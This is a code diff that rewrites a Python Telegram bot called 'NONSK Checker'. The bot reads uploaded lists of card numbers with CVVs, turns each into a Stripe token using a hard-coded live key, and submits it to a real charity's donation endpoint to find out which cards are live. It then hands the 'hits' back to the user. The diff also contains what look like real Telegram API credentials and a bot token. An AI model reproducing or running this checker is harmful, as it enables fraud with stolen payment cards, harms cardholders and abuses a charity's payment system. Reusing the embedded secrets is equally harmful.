@@ -1,19 +1,26 @@
-from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-import requests
-import asyncio
-import os
 import json
+import requests
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
 
-# Pyrogram Client Setup
-app = Client(
-    "cc_checker_bot",
-    api_id="28271744",
-    api_hash="1df4d2b4dc77dc5fd65622f9d8f6814d",
-    bot_token="7393878224:AAGTFjEclUdXYI0NzaRUUqmRUwFrNBhYVKo"
-)
+# Bot Configuration
+API_ID = "28271744"
+API_HASH = "1df4d2b4dc77dc5fd65622f9d8f6814d"
+BOT_TOKEN = "7393878224:AAGTFjEclUdXYI0NzaRUUqmRUwFrNBhYVKo"
 
-# Function to check card details
+bot = Client("CardCheckerBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+
+# Variables to track the results
+results = {
+    "total": 0,
+    "cvv": 0,
+    "ccn": 0,
+    "approved": 0,
+    "dead": 0,
+    "live_cards": [],
+}
+
+
 def check_card_details(card):
     try:
         cc, mes, ano, cvv = card.split('|')
@@ -25,45 +32,39 @@ def check_card_details(card):
         # 1st Request
         token_url = "https://api.stripe.com/v1/tokens"
         headers_1 = {
-            'Host': 'api.stripe.com',
-            'Accept': 'application/json',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0'
         }
         data_1 = {
             'card[number]': cc,
             'card[cvc]': cvv,
             'card[exp_month]': mes,
             'card[exp_year]': ano,
-            'key': 'pk_live_oeBlScsEPKeBvHnRXizVNSl4'
+            'key': 'pk_live_oeBlScsEPKeBvHnRXizVNSl4',
         }
 
         response_1 = requests.post(token_url, headers=headers_1, data=data_1)
         result_1 = response_1.json()
 
         if response_1.status_code != 200 or "error" in result_1:
-            return f"Error: {result_1.get('error', {}).get('message', 'Unknown error')}"
+            return f"DEAD\nMessage: {result_1.get('error', {}).get('message', 'Unknown error')}"
 
         token_id = result_1.get("id", "")
+        brand = result_1.get("card", {}).get("brand", "Unknown")
 
         # 2nd Request
         donation_url = "https://oneummah.org.uk/wp-admin/admin-ajax.php"
         headers_2 = {
-            'Host': 'oneummah.org.uk',
-            'Accept': 'application/json, text/javascript, */*; q=0.01',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0'
         }
         data_2 = {
             'action': 'k14_submit_donation',
             'token': token_id,
-            'data': 'donation_id=503695'
+            'data': 'donation_id=503695',
         }
 
         response_2 = requests.post(donation_url, headers=headers_2, data=data_2)
         result_2 = response_2.text
 
-        # Add key checks
         if "payment_intent_unexpected_state" in result_2:
             return "Payment Intent Confirmed✅"
         elif "succeeded" in result_2:
@@ -71,19 +72,19 @@ def check_card_details(card):
         elif "Your card has insufficient funds." in result_2:
             return "INSUFFICIENT FUNDS❎"
         elif "incorrect_zip" in result_2:
-            return "CVV LIVE✅"
+            return "CVV LIVE❎"
         elif "insufficient_funds" in result_2:
             return "INSUFFICIENT FUNDS❎"
         elif "security code is incorrect" in result_2:
-            return "CCN LIVE✅"
+            return "CCN LIVE❎"
         elif "Your card's security code is invalid." in result_2:
-            return "CCN LIVE✅"
+            return "CCN LIVE❎"
         elif "transaction_not_allowed" in result_2:
-            return "CVV LIVE✅"
+            return "CVV LIVE❎"
         elif "stripe_3ds2_fingerprint" in result_2:
-            return "3D REQUIRED"
+            return "3D REQUIRED❎"
         elif "redirect_url" in result_2:
-            return "Approved\n3DS Required❎"
+            return "Approved❎\n3DS Required"
         elif '"cvc_check": "pass"' in result_2:
             return "CHARGED✅"
         elif "Membership Confirmation" in result_2:
@@ -101,106 +102,110 @@ def check_card_details(card):
         elif "card_declined" in result_2:
             return "Your card was declined.❌"
         else:
-            try:
-                result_2_json = json.loads(result_2)
-                if "message" in result_2_json:
-                    return f"DEAD\nMessage: {result_2_json['message']}"
-                else:
-                    return f"DEAD\nRaw response 2: {result_2}"
-            except json.JSONDecodeError:
-                return f"DEAD\nRaw response 2: {result_2}"
-
+            return "DEAD❌"
     except Exception as e:
-        return f"Error: {str(e)}"
+        return f"An error occurred: {str(e)}"
 
-# /start Command Handler
-@app.on_message(filters.command("start"))
-async def start(_, message):
-    await message.reply(
-        "Welcome to the NONSK Checker Bot!\n\n"
-        "You can check cards by sending a text file and using the `/chk` command."
+
+@bot.on_message(filters.command("start"))
+async def start_command(client, message: Message):
+    await message.reply_text(
+        "**Welcome to NONSK Checker Bot!**\n\nUse /chk to check your cards.",
+        reply_markup=InlineKeyboardMarkup(
+            [[InlineKeyboardButton("Support", url="https://t.me/YourSupportChannel")]]
+        ),
     )
 
-# /chk Command Handler
-@app.on_message(filters.command("chk") & filters.reply)
-async def check_cards(_, message):
+
+@bot.on_message(filters.command("chk") & filters.reply)
+async def check_cards(client, message: Message):
+    global results
+    results = {
+        "total": 0,
+        "cvv": 0,
+        "ccn": 0,
+        "approved": 0,
+        "dead": 0,
+        "live_cards": [],
+    }
+
     if not message.reply_to_message.document:
-        await message.reply("Please reply to a text file containing CC details (format: `Cc|mm|yy|cvc`).")
+        await message.reply_text("❌ Please reply to a valid TXT file containing CC details.")
         return
 
-    # Download the file
-    file = await message.reply_to_message.download()
-    hits = []  # Store hits
-    live = []  # Store live responses
-    summary = []  # Store all checked cards
+    file_path = await message.reply_to_message.download()
+    with open(file_path, "r") as file:
+        cards = file.readlines()
 
-    # Initial Message
-    progress_message = await message.reply("↯ NONSK CHECKER\n\nStarting card checks... Please wait.")
+    results["total"] = len(cards)
+    msg = await message.reply_text(
+        f"**Found {results['total']} cards.**\n\nStarting checking...\nPlease wait."
+    )
 
-    try:
-        with open(file, "r") as f:
-            cc_list = f.readlines()
+    for index, card in enumerate(cards, start=1):
+        card = card.strip()
+        status = check_card_details(card)
 
-        total_cards = len(cc_list)
-        await progress_message.edit_text(f"↯ NONSK CHECKER\n\nFound {total_cards} cards. Checking now...")
+        if "✅" in status:
+            results["cvv"] += 1
+            results["live_cards"].append(card)
+        elif "❎" in status:
+            results["ccn"] += 1
+        else:
+            results["dead"] += 1
 
-        # Check each card
-        for idx, cc in enumerate(cc_list):
-            cc = cc.strip()
-            if not cc:
-                continue
-
-            result = check_card_details(cc)
-            summary.append(f"{cc} - {result}")
-
-            # Format message for hits
-            if "✅" in result:
-                hits.append(cc)
-                live.append(f"{cc} - {result}")
-                await message.reply(
-                    f"↯ NONSK CHECKER\n\n"
-                    f"✅ **HIT FOUND!**\n\n"
-                    f"**CC:** `{cc}`\n"
-                    f"**GATEWAY:** Stripe\n"
-                    f"**STATUS:** LIVE\n"
-                    f"**RESPONSE:** {result}",
-                    reply_markup=InlineKeyboardMarkup(
-                        [[InlineKeyboardButton("Show Hits", callback_data="show_hits")]]
-                    )
-                )
-
-            # Update progress
-            await progress_message.edit_text(
-                f"↯ NONSK CHECKER\n\nChecking card {idx + 1}/{total_cards}...\n\nHits so far: {len(hits)}"
-            )
-            await asyncio.sleep(1)  # To prevent spamming the server
-
-        # Final Summary
-        await progress_message.edit_text(
-            f"↯ NONSK CHECKER\n\n**Check Complete!**\n\nTotal Hits: {len(hits)}\nTotal Cards Checked: {total_cards}"
+        await msg.edit_text(
+            f"↯ **NONSK CHECKER**\n\n"
+            f"**CC:** `{card}`\n"
+            f"**Status:** {status}\n"
+            f"\n**Checking Info**\n"
+            f"------------------\n"
+            f"**Total:** {results['total']}\n"
+            f"**Checked:** {index}\n"
+            f"**Live:** {results['cvv']}\n"
+            f"**Dead:** {results['dead']}\n",
+            reply_markup=InlineKeyboardMarkup(
+                [
+                    [
+                        InlineKeyboardButton(f"Live: {results['cvv']}", callback_data="show_live"),
+                        InlineKeyboardButton(f"Dead: {results['dead']}", callback_data="show_dead"),
+                    ]
+                ]
+            ),
         )
 
-        # Send all hits as a file
-        if hits:
-            hits_file = "hits.txt"
-            with open(hits_file, "w") as hf:
-                hf.write("\n".join(hits))
-            await message.reply_document(hits_file, caption="Here are all the hits! ✅")
-            os.remove(hits_file)
+    await msg.edit_text(
+        f"**GAME OVER**\n\n"
+        f"**CHECKING RESULT**\n"
+        f"___________________\n"
+        f"**TOTAL:** {results['total']}\n"
+        f"**CVV:** {results['cvv']}\n"
+        f"**CCN:** {results['ccn']}\n"
+        f"**Approved:** {results['cvv']}\n"
+        f"**Dead:** {results['dead']}",
+        reply_markup=InlineKeyboardMarkup(
+            [[InlineKeyboardButton("Send Hits", callback_data="send_hits")]]
+        ),
+    )
 
-    except Exception as e:
-        await message.reply(f"Error processing file: {str(e)}")
 
-    finally:
-        # Clean up the file after processing
-        os.remove(file)
+@bot.on_callback_query(filters.regex("show_live"))
+async def show_live(client, callback_query):
+    if results["live_cards"]:
+        hits = "\n".join(results["live_cards"])
+        await callback_query.message.reply_text(f"**Live Hits:**\n\n{hits}")
+    else:
+        await callback_query.answer("No live hits found!", show_alert=True)
 
-# Callback Query Handler for "Show Hits" Button
-@app.on_callback_query(filters.regex("show_hits"))
-async def show_hits(_, callback_query):
-    await callback_query.answer("Hits will be shown if available!", show_alert=True)
 
-# Start the bot
+@bot.on_callback_query(filters.regex("send_hits"))
+async def send_hits(client, callback_query):
+    if results["live_cards"]:
+        hits = "\n".join(results["live_cards"])
+        await callback_query.message.reply_text(f"**Live Hits:**\n\n{hits}")
+    else:
+        await callback_query.answer("No live hits to send!", show_alert=True)
+
+
 if __name__ == "__main__":
-    print("Bot is running...")
-    app.run()
+    bot.run()
